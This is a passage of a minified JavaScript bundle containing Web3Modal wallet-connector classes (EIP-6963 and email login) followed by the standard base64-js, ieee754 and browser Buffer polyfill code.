super.subscribeState(n=>e({...n,selectedNetworkId:yi.caipNetworkIdToNumber(n.selectedNetworkId)}))}syncRequestedNetworks(e){const n=e==null?void 0:e.map(r=>{var o,i;return{id:`${ge.EIP155}:${r.id}`,name:r.name,imageId:Un.EIP155NetworkImageIds[r.id],imageUrl:(i=(o=this.options)==null?void 0:o.chainImages)==null?void 0:i[r.id]}});this.setRequestedCaipNetworks(n??[])}async syncAccount(){const{address:e,isConnected:n}=Os(),{chain:r}=Qo();if(this.resetAccount(),n&&e&&r){const o=`${ge.EIP155}:${r.id}:${e}`;this.setIsConnected(n),this.setCaipAddress(o),await Promise.all([this.syncProfile(e,r),this.syncBalance(e,r),this.getApprovedCaipNetworksData()]),this.hasSyncedConnectedAccount=!0}else!n&&this.hasSyncedConnectedAccount&&(this.resetWcConnection(),this.resetNetwork())}async syncNetwork(){var o,i,a,s;const{address:e,isConnected:n}=Os(),{chain:r}=Qo();if(r){const c=String(r.id),l=`${ge.EIP155}:${c}`;if(this.setCaipNetwork({id:l,name:r.name,imageId:Un.EIP155NetworkImageIds[r.id],imageUrl:(i=(o=this.options)==null?void 0:o.chainImages)==null?void 0:i[r.id]}),n&&e){const u=`${ge.EIP155}:${r.id}:${e}`;if(this.setCaipAddress(u),(s=(a=r.blockExplorers)==null?void 0:a.default)!=null&&s.url){const p=`${r.blockExplorers.default.url}/address/${e}`;this.setAddressExplorerUrl(p)}else this.setAddressExplorerUrl(void 0);this.hasSyncedConnectedAccount&&(await this.syncProfile(e,r),await this.syncBalance(e,r))}}}async syncProfile(e,n){if(n.id!==ap.id){this.setProfileName(null),this.setProfileImage(null);return}try{const{name:r,avatar:o}=await this.fetchIdentity({caipChainId:`${ge.EIP155}:${n.id}`,address:e});this.setProfileName(r),this.setProfileImage(o)}catch{const r=await O2({address:e,chainId:n.id});if(r){this.setProfileName(r);const o=await $2({name:r,chainId:n.id});o&&this.setProfileImage(o)}}}async syncBalance(e,n){var o,i,a;const r=await A2({address:e,chainId:n.id,token:(a=(i=(o=this.options)==null?void 0:o.tokens)==null?void 0:i[n.id])==null?void 0:a.address});this.setBalance(r.formatted,r.symbol)}syncConnectors(e){const n=[];e.connectors.forEach(({id:r,name:o})=>{var i,a;[ge.EIP6963_CONNECTOR_ID,ge.EMAIL_CONNECTOR_ID].includes(r)||n.push({id:r,explorerId:Un.ConnectorExplorerIds[r],imageId:Un.ConnectorImageIds[r],imageUrl:(a=(i=this.options)==null?void 0:i.connectorImages)==null?void 0:a[r],name:Un.ConnectorNamesMap[r]??o,type:Un.ConnectorTypesMap[r]??"EXTERNAL"})}),this.setConnectors(n)}async syncEmailConnector(e){const n=e.connectors.find(({id:r})=>r==="w3mEmail");if(n){const r=await n.getProvider();this.addConnector({id:ge.EMAIL_CONNECTOR_ID,type:"EMAIL",name:"Email",provider:r})}}eip6963EventHandler(e,n){var r,o;if(n.detail){const{info:i,provider:a}=n.detail;this.getConnectors().find(l=>l.name===i.name)||(this.addConnector({id:ge.EIP6963_CONNECTOR_ID,type:"ANNOUNCED",imageUrl:i.icon??((o=(r=this.options)==null?void 0:r.connectorImages)==null?void 0:o[ge.EIP6963_CONNECTOR_ID]),name:i.name,provider:a,info:i}),e.isAuthorized({info:i,provider:a}))}}listenEIP6963Connector(e){const n=e.connectors.find(r=>r.id===ge.EIP6963_CONNECTOR_ID);if(typeof window<"u"&&n){const r=this.eip6963EventHandler.bind(this,n);window.addEventListener(ge.EIP6963_ANNOUNCE_EVENT,r),window.dispatchEvent(new Event(ge.EIP6963_REQUEST_EVENT))}}async listenEmailConnector(e){const n=e.connectors.find(r=>r.id===ge.EMAIL_CONNECTOR_ID);if(typeof window<"u"&&n){super.setLoading(!0);const r=await n.getProvider(),o=r.getLoginEmailUsed();super.setLoading(o),r.onRpcRequest(()=>{super.open({view:"ApproveTransaction"})}),r.onRpcResponse(()=>{super.close()}),r.onIsConnected(()=>{super.setLoading(!1)})}}}var hs=function(t,e,n,r,o){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!o)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?t!==e||!o:!e.has(t))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?o.call(t,n):o?o.value=n:e.set(t,n),n},Nr=function(t,e,n,r){if(n==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?t!==e||!r:!e.has(t))throw new TypeError("Cannot read private member from an object whose class did not declare it");return n==="m"?r:n==="a"?r.call(t):r?r.value:e.get(t)},ys,Qt;const ps="connectedRdns";class J4 extends Sd{constructor(e){super({chains:e.chains,options:{shimDisconnect:!0}}),this.id="eip6963",this.name="EIP6963",ys.set(this,void 0),Qt.set(this,void 0),this.onAccountsChanged=n=>{var r;n.length===0?((r=this.storage)==null||r.removeItem(ps),this.emit("disconnect")):n[0]&&this.emit("change",{account:Vt(n[0])})},hs(this,ys,this.options.getProvider(),"f")}async connect(e){var r;const n=await super.connect(e);return Nr(this,Qt,"f")&&((r=this.storage)==null||r.setItem(ps,Nr(this,Qt,"f").info.rdns)),n}async disconnect(){var e;await super.disconnect(),(e=this.storage)==null||e.removeItem(ps),hs(this,Qt,void 0,"f")}async isAuthorized(e){var r;const n=(r=this.storage)==null?void 0:r.getItem(ps);if(n){if(Nr(this,Qt,"f")&&n===Nr(this,Qt,"f").info.rdns&&(await Nr(this,Qt,"f").provider.request({method:"eth_accounts"})).length)return!0;e&&hs(this,Qt,e,"f")}return super.isAuthorized()}async getProvider(){var e;return Promise.resolve(((e=Nr(this,Qt,"f"))==null?void 0:e.provider)??Nr(this,ys,"f"))}setEip6963Wallet(e){hs(this,Qt,e,"f")}}ys=new WeakMap,Qt=new WeakMap;class X4 extends Oc{constructor(e){super(e),this.id="w3mEmail",this.name="Web3Modal Email",this.ready=!0,this.provider={},typeof window<"u"&&(this.provider=new _4(e.options.projectId))}async getProvider(){return Promise.resolve(this.provider)}async connect(e={}){const{address:n,chainId:r}=await this.provider.connect({chainId:e.chainId});return{account:n,chain:{id:r,unsupported:this.isChainUnsupported(1)}}}async switchChain(e){try{const n=this.chains.find(o=>o.id===e);if(!n)throw new an(new Error("chain not found on connector."));await this.provider.switchNetwork(e);const r=this.isChainUnsupported(e);return this.emit("change",{chain:{id:e,unsupported:r}}),n}catch(n){throw n instanceof Error?new an(n):n}}async disconnect(){await this.provider.disconnect()}async getAccount(){const{address:e}=await this.provider.connect();return e}async getChainId(){const{chainId:e}=await this.provider.getChainId();return e}async getWalletClient(){const{address:e,chainId:n}=await this.provider.connect();return Promise.resolve(Ic({account:e,chain:{id:n},transport:Ac(this.provider)}))}async isAuthorized(){const{isConnected:e}=await this.provider.isConnected();return e}onAccountsChanged(){}onChainChanged(){}onDisconnect(){}}var I1={},Xc={};Xc.byteLength=t8;Xc.toByteArray=r8;Xc.fromByteArray=a8;var xn=[],Ht=[],Q4=typeof Uint8Array<"u"?Uint8Array:Array,kl="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(var vi=0,e8=kl.length;vi<e8;++vi)xn[vi]=kl[vi],Ht[kl.charCodeAt(vi)]=vi;Ht[45]=62;Ht[95]=63;function $1(t){var e=t.length;if(e%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var n=t.indexOf("=");n===-1&&(n=e);var r=n===e?0:4-n%4;return[n,r]}function t8(t){var e=$1(t),n=e[0],r=e[1];return(n+r)*3/4-r}function n8(t,e,n){return(e+n)*3/4-n}function r8(t){var e,n=$1(t),r=n[0],o=n[1],i=new Q4(n8(t,r,o)),a=0,s=o>0?r-4:r,c;for(c=0;c<s;c+=4)e=Ht[t.charCodeAt(c)]<<18|Ht[t.charCodeAt(c+1)]<<12|Ht[t.charCodeAt(c+2)]<<6|Ht[t.charCodeAt(c+3)],i[a++]=e>>16&255,i[a++]=e>>8&255,i[a++]=e&255;return o===2&&(e=Ht[t.charCodeAt(c)]<<2|Ht[t.charCodeAt(c+1)]>>4,i[a++]=e&255),o===1&&(e=Ht[t.charCodeAt(c)]<<10|Ht[t.charCodeAt(c+1)]<<4|Ht[t.charCodeAt(c+2)]>>2,i[a++]=e>>8&255,i[a++]=e&255),i}function i8(t){return xn[t>>18&63]+xn[t>>12&63]+xn[t>>6&63]+xn[t&63]}function o8(t,e,n){for(var r,o=[],i=e;i<n;i+=3)r=(t[i]<<16&16711680)+(t[i+1]<<8&65280)+(t[i+2]&255),o.push(i8(r));return o.join("")}function a8(t){for(var e,n=t.length,r=n%3,o=[],i=16383,a=0,s=n-r;a<s;a+=i)o.push(o8(t,a,a+i>s?s:a+i));return r===1?(e=t[n-1],o.push(xn[e>>2]+xn[e<<4&63]+"==")):r===2&&(e=(t[n-2]<<8)+t[n-1],o.push(xn[e>>10]+xn[e>>4&63]+xn[e<<2&63]+"=")),o.join("")}var Qd={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */Qd.read=function(t,e,n,r,o){var i,a,s=o*8-r-1,c=(1<<s)-1,l=c>>1,u=-7,p=n?o-1:0,m=n?-1:1,g=t[e+p];for(p+=m,i=g&(1<<-u)-1,g>>=-u,u+=s;u>0;i=i*256+t[e+p],p+=m,u-=8);for(a=i&(1<<-u)-1,i>>=-u,u+=r;u>0;a=a*256+t[e+p],p+=m,u-=8);if(i===0)i=1-l;else{if(i===c)return a?NaN:(g?-1:1)*(1/0);a=a+Math.pow(2,r),i=i-l}return(g?-1:1)*a*Math.pow(2,i-r)};Qd.write=function(t,e,n,r,o,i){var a,s,c,l=i*8-o-1,u=(1<<l)-1,p=u>>1,m=o===23?Math.pow(2,-24)-Math.pow(2,-77):0,g=r?0:i-1,w=r?1:-1,v=e<0||e===0&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(s=isNaN(e)?1:0,a=u):(a=Math.floor(Math.log(e)/Math.LN2),e*(c=Math.pow(2,-a))<1&&(a--,c*=2),a+p>=1?e+=m/c:e+=m*Math.pow(2,1-p),e*c>=2&&(a++,c/=2),a+p>=u?(s=0,a=u):a+p>=1?(s=(e*c-1)*Math.pow(2,o),a=a+p):(s=e*Math.pow(2,p-1)*Math.pow(2,o),a=0));o>=8;t[n+g]=s&255,g+=w,s/=256,o-=8);for(a=a<<o|s,l+=o;l>0;t[n+g]=a&255,g+=w,a/=256,l-=8);t[n+g-w]|=v*128};/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */(function(t){const e=Xc,n=Qd,r=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;t.Buffer=s,t.SlowBuffer=b,t.INSPECT_MAX_BYTES=50;const o=2147483647;t.kMaxLength=o,s.TYPED_ARRAY_SUPPORT=i(),!s.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function i(){try{const y=new Uint8Array(1),d={foo:function(){return 42}};return Object.setPrototypeOf(d,Uint8Array.prototype),Object.setPrototypeOf(y,d),y.foo()===42}catch{return!1}}Object.defineProperty(s.prototype,"parent",{enumerable:!0,get:function(){if(s.isBuffer(this))return this.buffer}}),Object.defineProperty(s.prototype,"offset",{enumerable:!0,get:function(){if(s.isBuffer(this))return this.byteOffset}});function a(y){if(y>o)throw new RangeError('The value "'+y+'" is invalid for option "size"');const d=new Uint8Array(y);return Object.setPrototypeOf(d,s.prototype),d}function s(y,d,h){if(typeof y=="number"){if(typeof d=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return p(y)}return c(y,d,h)}s.poolSize=8192;function c(y,d,h){if(typeof y=="string")return m(y,d);if(ArrayBuffer.isView(y))return w(y);if(y==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof y);if(je(y,ArrayBuffer)||y&&je(y.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&(je(y,SharedArrayBuffer)||y&&je(y.buffer,SharedArrayBuffer)))return v(y,d,h);if(typeof y=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const S=y.valueOf&&y.valueOf();if(S!=null&&S!==y)return s.from(S,d,h);const P=E(y);if(P)return P;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof y[Symbol.toPrimitive]=="function")return s.from(y[Symbol.toPrimitive]("string"),d,h);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof y)}s.from=function(y,d,h){return c(y,d,h)},Object.setPrototypeOf(s.prototype,Uint8Array.prototype),Object.setPrototypeOf(s,Uint8Array);function l(y){if(typeof y!="number")throw new TypeError('"size" argument must be of type number');if(y<0)throw new RangeError('The value "'+y+'" is invalid for option "size"')}function u(y,d,h){return l(y),y<=0?a(y):d!==void 0?typeof h=="string"?a(y).fill(d,h):a(y).fill(d):a(y)}s.alloc=function(y,d,h){return u(y,d,h)};function p(y){return l(y),a(y<0?0:I(y)|0)}s.allocUnsafe=function(y){return p(y)},s.allocUnsafeSlow=function(y){return p(y)};function m(y,d){if((typeof d!="string"||d==="")&&(d="utf8"),!s.isEncoding(d))throw new TypeError("Unknown encoding: "+d);const h=_(y,d)|0;let S=a(h);const P=S.write(y,d);return P!==h&&(S=S.slice(0,P)),S}function g(y){const d=y.length<0?0:I(y.length)|0,h=a(d);for(let S=0;S<d;S+=1)h[S]=y[S]&255;return h}function w(y){if(je(y,Uint8Array)){const d=new Uint8Array(y);return v(d.buffer,d.byteOffset,d.byteLength)}return g(y)}function v(y,d,h){if(d<0||y.byteLength<d)throw new RangeError('"offset" is outside of buffer bounds');if(y.byteLength<d+(h||0))throw new RangeError('"length" is outside of buffer bounds');let S;return d===void 0&&h===void 0?S=new Uint8Array(y):h===void 0?S=new Uint8Array(y,d):S=new Uint8Array(y,d,h),Object.setPrototypeOf(S,s.prototype),S}function E(y){if(s.isBuffer(y)){const d=I(y.length)|0,h=a(d);return h.length===0||y.copy(h,0,0,d),h}if(y.length!==void 0)return typeof y.length!="number"||it(y.length)?a(0):g(y);if(y.type==="Buffer"&&Array.isArray(y.data))return g(y.data)}function I(y){if(y>=o)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+o.toString(16)+" bytes");return y|0}function b(y){return+y!=y&&(y=0),s.alloc(+y)}s.isBuffer=function(d){return d!=null&&d._isBuffer===!0&&d!==s.prototype},s.compare=function(d,h){if(je(d,Uint8Array)&&(d=s.from(d,d.offset,d.byteLength)),je(h,Uint8Array)&&(h=s.from(h,h.offset,h.byteLength)),!s.isBuffer(d)||!s.isBuffer(h))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(d===h)return 0;let S=d.length,P=h.length;for(let D=0,M=Math.min(S,P);D<M;++D)if(d[D]!==h[D]){S=d[D],P=h[D];break}return S<P?-1:P<S?1:0},s.isEncoding=function(d){switch(String(d).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},s.concat=function(d,h){if(!Array.isArray(d))throw new TypeError('"list" argument must be an Array of Buffers');if(d.length===0)return s.alloc(0);let S;if(h===void 0)for(h=0,S=0;S<d.length;++S)h+=d[S].length;const P=s.allocUnsafe(h);let D=0;for(S=0;S<d.length;++S){let M=d[S];if(je(M,Uint8Array))D+M.length>P.length?(s.isBuffer(M)||(M=s.from(M)),M.copy(P,D)):Uint8Array.prototype.set.call(P,M,D);else if(s.isBuffer(M))M.copy(P,D);else throw new TypeError('"list" argument must be an Array of Buffers');D+=M.length}return P};function _(y,d){if(s.isBuffer(y))return y.length;if(ArrayBuffer.isView(y)||je(y,ArrayBuffer))return y.byteLength;if(typeof y!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof y);const h=y.length,S=arguments.length>2&&arguments[2]===!0;if(!S&&h===0)return 0;let P=!1;for(;;)switch(d){case"ascii":case"latin1":case"binary":return h;case"utf8":case"utf-8":return Xn(y).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return h*2;case"hex":return h>>>1;case"base64":return ct(y).length;default:if(P)return S?-1:Xn(y).length;d=(""+d).toLowerCase(),P=!0}}s.byteLength=_;function x(y,d,h){let S=!1;if((d===void 0||d<0)&&(d=0),d>this.length||((h===void 0||h>this.length)&&(h=this.length),h<=0)||(h>>>=0,d>>>=0,h<=d))return"";for(y||(y="utf8");;)switch(y){case"hex":return X(this,d,h);case"utf8":case"utf-8":return W(this,d,h);case"ascii":return B(this,d,h);case"latin1":case"binary":return j(this,d,h);case"base64":return re(this,d,h);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return ne(this,d,h);default:if(S)throw new TypeError("Unknown encoding: "+y);y=(y+"").toLowerCase(),S=!0}}s.prototype._isBuffer=!0;function C(y,d,h){const S=y[d];y[d]=y[h],y[h]=S}s.prototype.swap16=function(){const d=this.length;if(d%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let h=0;h<d;h+=2)C(this,h,h+1);return this},s.prototype.swap32=function(){const d=this.length;if(d%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let h=0;h<d;h+=4)C(this,h,h+3),C(this,h+1,h+2);return this},s.prototype.swap64=function(){const d=this.length;if(d%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let h=0;h<d;h+=8)C(this,h,h+7),C(this,h+1,h+6),C(this,h+2,h+5),C(this,h+3,h+4);return this},s.prototype.toString=function(){const d=this.length;return d===0?"":arguments.length===0?W(this,0,d):x.apply(this,arguments)},s.prototype.toLocaleString=s.prototype.toString,s.prototype.equals=function(d){if(!s.isBuffer(d))throw new TypeError("Argument must be a Buffer");return this===d?!0:s.compare(this,d)===0},s.prototype.inspect=function(){let d="";const h=t.INSPECT_MAX_BYTES;return d=this.toString("hex",0,h).replace(/(.{2})/g,"$1 ").trim(),this.length>h&&(d+=" ... "),"<Buffer "+d+">"},r&&(s.prototype[r]=s.prototype.inspect),s.prototype.compare=function(d,h,S,P,D){if(je(d,Uint8Array)&&(d=s.from(d,d.offset,d.byteLength)),!s.isBuffer(d))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof d);if(h===void 0&&(h=0),S===void 0&&(S=d?d.length:0),P===void 0&&(P=0),D===void 0&&(D=this.length),h<0||S>d.length||P<0||D>this.length)throw new RangeError("out of range index");if(P>=D&&h>=S)return 0;if(P>=D)return-1;if(h>=S)return 1;if(h>>>=0,S>>>=0,P>>>=0,D>>>=0,this===d)return 0;let M=D-P,ce=S-h;const Ie=Math.min(M,ce),Ze=this.slice(P,D),Je=d.slice(h,S);for(let Fe=0;Fe<Ie;++Fe)if(Ze[Fe]!==Je[Fe]){M=Ze[Fe],ce=Je[Fe];break}return M<ce?-1:ce<M?1:0};function A(y,d,h,S,P){if(y.length===0)return-1;if(typeof h=="string"?(S=h,h=0):h>2147483647?h=2147483647:h<-2147483648&&(h=-2147483648),h=+h,it(h)&&(h=P?0:y.length-1),h<0&&(h=y.length+h),h>=y.length){if(P)return-1;h=y.length-1}else if(h<0)if(P)h=0;else return-1;if(typeof d=="string"&&(d=s.from(d,S)),s.isBuffer(d))return d.length===0?-1:f(y,d,h,S,P);if(typeof d=="number")return d=d&255,typeof Uint8Array.prototype.indexOf=="function"?P?Uint8Array.prototype.indexOf.call(y,d,h):Uint8Array.prototype.lastIndexOf.call(y,d,h):f(y,[d],h,S,P);throw new TypeError("val must be string, number or Buffer")}function f(y,d,h,S,P){let D=1,M=y.length,ce=d.length;if(S!==void 0&&(S=String(S).toLowerCase(),S==="ucs2"||S==="ucs-2"||S==="utf16le"||S==="utf-16le")){if(y.length<2||d.length<2)return-1;D=2,M/=2,ce/=2,h/=2}function Ie(Je,Fe){return D===1?Je[Fe]:Je.readUInt16BE(Fe*D)}let Ze;if(P){let Je=-1;for(Ze=h;Ze<M;Ze++)if(Ie(y,Ze)===Ie(d,Je===-1?0:Ze-Je)){if(Je===-1&&(Je=Ze),Ze-Je+1===ce)return Je*D}else Je!==-1&&(Ze-=Ze-Je),Je=-1}else for(h+ce>M&&(h=M-ce),Ze=h;Ze>=0;Ze--){let Je=!0;for(let Fe=0;Fe<ce;Fe++)if(Ie(y,Ze+Fe)!==Ie(d,Fe)){Je=!1;break}if(Je)return Ze}return-1}s.prototype.includes=function(d,h,S){return this.indexOf(d,h,S)!==-1},s.prototype.indexOf=function(d,h,S){return A(this,d,h,S,!0)},s.prototype.lastIndexOf=function(d,h,S){return A(this,d,h,S,!1)};function T(y,d,h,S){h=Number(h)||0;const P=y.length-h;S?(S=Number(S),S>P&&(S=P)):S=P;const D=d.length;S>D/2&&(S=D/2);let M;for(M=0;M<S;++M){const ce=parseInt(d.substr(M*2,2),16);if(it(ce))return M;y[h+M]=ce}return M}function R(y,d,h,S){return tt(Xn(d,y.length-h),y,h,S)}function N(y,d,h,S){return tt(mo(d),y,h,S)}function k(y,d,h,S){return tt(ct(d),y,h,S)}function Y(y,d,h,S){return tt(rs(d,y.length-h),y,h,S)}s.prototype.write=function(d,h,S,P){if(h===void 0)P="utf8",S=this.length,h=0;else if(S===void 0&&typeof h=="string")P=h,S=this.length,h=0;else if(isFinite(h))h=h>>>0,isFinite(S)?(S=S>>>0,P===void 0&&(P="utf8")):(P=S,S=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const D=this.length-h;if((S===void 0||S>D)&&(S=D),d.length>0&&(S<0||h<0)||h>this.length)throw new RangeError("Attempt to write outside buffer bounds");P||(P="utf8");let M=!1;for(;;)switch(P){case"hex":return T(this,d,h,S);case"utf8":case"utf-8":return R(this,d,h,S);case"ascii":case"latin1":case"binary":return N(this,d,h,S);case"base64":return k(this,d,h,S);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return Y(this,d,h,S);default:if(M)throw new TypeError("Unknown encoding: "+P);P=(""+P).toLowerCase(),M=!0}},s.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function re(y,d,h){return d===0&&h===y.length?e.fromByteArray(y):e.fromByteArray(y.slice(d,h))}function W(y,d,h){h=Math.min(y.length,h);const S=[];let P=d;for(;P<h;){const D=y[P];let M=null,ce=D>239?4:D>223?3:D>191?2:1;if(P+ce<=h){let Ie,Ze,Je,Fe;switch(ce){case 1:D<128&&(M=D);break;case 2:Ie=y[P+1],(Ie&192)===128&&(Fe=(D&31)<<6|Ie&63,Fe>127&&(M=Fe));break;case 3:Ie=y[P+1],Ze=y[P+2],(Ie&192)===128&&(Ze&192)===128&&(Fe=(D&15)<<12|(Ie&63)<<6|Ze&63,Fe>2047&&(Fe<55296||Fe>57343)&&(M=Fe));break;case 4:Ie=y[P+1],Ze=y[P+2],Je=y[P+3],(Ie&192)===128&&(Ze&192)===128&&(Je&192)===128&&(Fe=(D&15)<<18|(Ie&63)<<12|(Ze&63)<<6|Je&63,Fe>65535&&Fe<1114112&&(M=Fe))}}M===null?(M=65533,ce=1):M>65535&&(M-=65536,S.push(M>>>10&1023|55296),M=56320|M&1023),S.push(M),P+=ce}return U(S)}const L=4096;function U(y){const d=y.length;if(d<=L)return String.fromCharCode.apply(String,y);let h="",S=0;for(;S<d;)h+=String.fromCharCode.apply(String,y.slice(S,S+=L));return h}function B(y,d,h){let S="";h=Math.min(y.length,h);for(let P=d;P<h;++P)S+=String.fromCharCode(y[P]&127);return S}function j(y,d,h){let S="";h=Math.min(y.length,h);for(let P=d;P<h;++P)S+=String.fromCharCode(y[P]);return S}function X(y,d,h){const S=y.length;(!d||d<0)&&(d=0),(!h||h<0||h>S)&&(h=S);let P="";for(let D=d;D<h;++D)P+=ut[y[D]];return P}function ne(y,d,h){const S=y.slice(d,h);let P="";for(let D=0;D<S.length-1;D+=2)P+=String.fromCharCode(S[D]+S[D+1]*256);return P}s.prototype.slice=function(d,h){const S=this.length;d=~~d,h=h===void 0?S:~~h,d<0?(d+=S,d<0&&(d=0)):d>S&&(d=S),h<0?(h+=S,h<0&&(h=0)):h>S&&(h=S),h<d&&(h=d);const P=this.subarray(d,h);return Object.setPrototypeOf(P,s.prototype),P};function Q(y,d,h){if(y%1!==0||y<0)throw new RangeError("offset is not uint");if(y+d>h)throw new RangeError("Trying to access beyond buffer length")}s.prototype.readUintLE=s.prototype.readUIntLE=function(d,h,S){d=d>>>0,h=h>>>0,S||Q(d,h,this.length);let P=this[d],D=1,M=0;for(;++M<h&&(D*=256);)P+=this[d+M]*D;return P},s.prototype.readUintBE=s.prototype.readUIntBE=function(d,h,S){d=d>>>0,h=h>>>0,S||Q(d,h,this.length);let P=this[d+--h],D=1;for(;h>0&&(D*=256);)P+=this[d+--h]*D;return P},s.prototype.readUint8=s.prototype.readUInt8=function(d,h){return d=d>>>0,h||Q(d,1,this.length),this[d]},s.prototype.readUint16LE=s.prototype.readUInt16LE=function(d,h){return d=d>>>0,h||Q(d,2,this.length),this[d]|this[d+1]<<8},s.prototype.readUint16BE=s.prototype.readUInt16BE=function(d,h){return d=d>>>0,h||Q(d,2,this.length),this[d]<<8|this[d+1]},s.prototype.readUint32LE=s.prototype.readUInt32LE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),(this[d]|this[d+1]<<8|this[d+2]<<16)+this[d+3]*16777216},s.prototype.readUint32BE=s.prototype.readUInt32BE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),this[d]*16777216+(this[d+1]<<16|this[d+2]<<8|this[d+3])},s.prototype.readBigUInt64LE=Ve(function(d){d=d>>>0,De(d,"offset");const h=this[d],S=this[d+7];(h===void 0||S===void 0)&&kt(d,this.length-8);const P=h+this[++d]*2**8+this[++d]*2**16+this[++d]*2**24,D=this[++d]+this[++d]*2**8+this[++d]*2**16+S*2**24;return BigInt(P)+(BigInt(D)<<BigInt(32))}),s.prototype.readBigUInt64BE=Ve(function(d){d=d>>>0,De(d,"offset");const h=this[d],S=this[d+7];(h===void 0||S===void 0)&&kt(d,this.length-8);const P=h*2**24+this[++d]*2**16+this[++d]*2**8+this[++d],D=this[++d]*2**24+this[++d]*2**16+this[++d]*2**8+S;return(BigInt(P)<<BigInt(32))+BigInt(D)}),s.prototype.readIntLE=function(d,h,S){d=d>>>0,h=h>>>0,S||Q(d,h,this.length);let P=this[d],D=1,M=0;for(;++M<h&&(D*=256);)P+=this[d+M]*D;return D*=128,P>=D&&(P-=Math.pow(2,8*h)),P},s.prototype.readIntBE=function(d,h,S){d=d>>>0,h=h>>>0,S||Q(d,h,this.length);let P=h,D=1,M=this[d+--P];for(;P>0&&(D*=256);)M+=this[d+--P]*D;return D*=128,M>=D&&(M-=Math.pow(2,8*h)),M},s.prototype.readInt8=function(d,h){return d=d>>>0,h||Q(d,1,this.length),this[d]&128?(255-this[d]+1)*-1:this[d]},s.prototype.readInt16LE=function(d,h){d=d>>>0,h||Q(d,2,this.length);const S=this[d]|this[d+1]<<8;return S&32768?S|4294901760:S},s.prototype.readInt16BE=function(d,h){d=d>>>0,h||Q(d,2,this.length);const S=this[d+1]|this[d]<<8;return S&32768?S|4294901760:S},s.prototype.readInt32LE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),this[d]|this[d+1]<<8|this[d+2]<<16|this[d+3]<<24},s.prototype.readInt32BE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),this[d]<<24|this[d+1]<<16|this[d+2]<<8|this[d+3]},s.prototype.readBigInt64LE=Ve(function(d){d=d>>>0,De(d,"offset");const h=this[d],S=this[d+7];(h===void 0||S===void 0)&&kt(d,this.length-8);const P=this[d+4]+this[d+5]*2**8+this[d+6]*2**16+(S<<24);return(BigInt(P)<<BigInt(32))+BigInt(h+this[++d]*2**8+this[++d]*2**16+this[++d]*2**24)}),s.prototype.readBigInt64BE=Ve(function(d){d=d>>>0,De(d,"offset");const h=this[d],S=this[d+7];(h===void 0||S===void 0)&&kt(d,this.length-8);const P=(h<<24)+this[++d]*2**16+this[++d]*2**8+this[++d];return(BigInt(P)<<BigInt(32))+BigInt(this[++d]*2**24+this[++d]*2**16+this[++d]*2**8+S)}),s.prototype.readFloatLE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),n.read(this,d,!0,23,4)},s.prototype.readFloatBE=function(d,h){return d=d>>>0,h||Q(d,4,this.length),n.read(this,d,!1,23,4)},s.prototype.readDoubleLE=function(d,h){return d=d>>>0,h||Q(d,8,this.length),n.read(this,d,!0,52,8)},s.prototype.readDoubleBE=function(d,h){return d=d>>>0,h||Q(d,8,this.length),n.read(this,d,!1,52,8)};function oe(y,d,h,S,P,D){if(!s.isBuffer(y))throw new TypeError('"buffer" argument must be a Buffer instance');if(d>P||d<D)throw new RangeError('"value" argument is out of bounds');if(h+S>y.length)throw new RangeError("Index out of range")}s.prototype.writeUintLE=s.prototype.writeUIntLE=function(d,h,S,P){if(d=+d,h=h>>>0,S=S>>>0,!P){const ce=Math.pow(2,8*S)-1;oe(this,d,h,S,ce,0)}let D=1,M=0;for(this[h]=d&255;++M<S&&(D*=256);)this[h+M]=d/D&255;return h+S},s.prototype.writeUintBE=s.prototype.writeUIntBE=function(d,h,S,P){if(d=+d,h=h>>>0,S=S>>>0,!P){const ce=Math.pow(2,8*S)-1;oe(this,d,h,S,ce,0)}let D=S-1,M=1;for(this[h+D]=d&255;--D>=0&&(M*=256);)this[h+D]=d/M&255;return h+S},s.prototype.writeUint8=s.prototype.writeUInt8=function(d,h,S){return 